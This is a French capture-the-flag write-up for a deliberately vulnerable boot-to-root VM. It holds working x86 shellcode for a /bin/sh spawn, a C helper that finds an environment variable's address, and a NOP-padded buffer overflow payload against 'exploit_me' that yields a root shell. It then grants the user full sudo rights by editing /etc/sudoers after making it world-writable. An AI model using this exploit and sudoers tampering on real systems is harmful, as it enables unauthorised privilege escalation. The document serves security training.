# Writeup numéro 4:
## Étape 0 - Lancement de la VM:

![BootToRoot](/assets/start_vm.png)

## Étape 1 - Connexion à la VM

Nous pouvons nous connecter à la VM avec les identifiants zaz trouvés avec la méthode décrite sur le [writeup1](/writeup1.md)

## Étape 2 - Exécution buffer overflow

Dabord on va créer une nouvelle variable d'environnement avec l'instruction pour lancer un nouveau terminal.

```sh
export OPEN_TERMINAL=$'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xdb\x89\xd8\xb0\x17\xcd\x80\x31\xdb\x89\xd8\xb0\x2e\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80'
```

On écrit un petit programme qui nous retourne l'adresse de la variable d'environnement passé en parametre.

```c
// getEnvAddress.c
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char **argv)
{
	if (argc == 2)
	{
		char* ptr = getenv(argv[1]);
		printf("%p\n", ptr);
	}
}
```

On le compile et on lui passe le nom de la variable pour connaître son adresse.

```sh
~$ gcc getEnvAddress.c -o getEnvAddress
~$ ./getEnvAddress OPEN_TERMINAL
0xbffffe60
```

On peut alors lancer exploit_me avec une chaine de caractères qui écrit plus de ce qui est prévu.

```sh
~$ ./exploit_me $(python -c 'print "\x90" * 140 + "\x60\xfe\xff\xbf"')
```

On remplit les 140 caractères avec des [NOP](https://en.wikipedia.org/wiki/NOP_(code)) (qui fait passer à l'octet suivant) et on écrit après l'adresse (en [little-endian](https://en.wikipedia.org/wiki/Endianness#Little-endian)) de la variable d'environnement qui contient le shellcode.

Cela nous permet avoir un terminal sur lequel on aura les droits root.

```
~$ ./exploit_me $(python -c 'print "\x90" * 140 + "\x60\xfe\xff\xbf"')
��������������������������������������������������������������������������������������������������������������������������������������������`���
# id
uid=0(root) gid=0(root) groups=0(root),1005(zaz)
```
Pour donner tous les privileges à zaz on peut modifier les droits du fichier /etc/sudoers, ajouter zaz après root et on change encore les droits du fichier.

```
# chmod 666 /etc/sudoers
```

```vim
[...]
16 # Cmnd alias specification
17
18 # User privilege specification
19 root    ALL=(ALL:ALL) ALL
20 zaz     ALL=(ALL:ALL) ALL
21
22 # Members of the admin group may gain root privileges
23 %admin ALL=(ALL) ALL
[...]
```

```
# chmod 440 /etc/sudoers
```

Nous pouvons maintenant passer root avec le mot de passe zaz.

```
zaz@BornToSecHackMe:~$ sudo su
[sudo] password for zaz:
root@BornToSecHackMe:/home/zaz# id
uid=0(root) gid=0(root) groups=0(root)
```

[Plus d'information](https://beta.hackndo.com/retour-a-la-libc/)
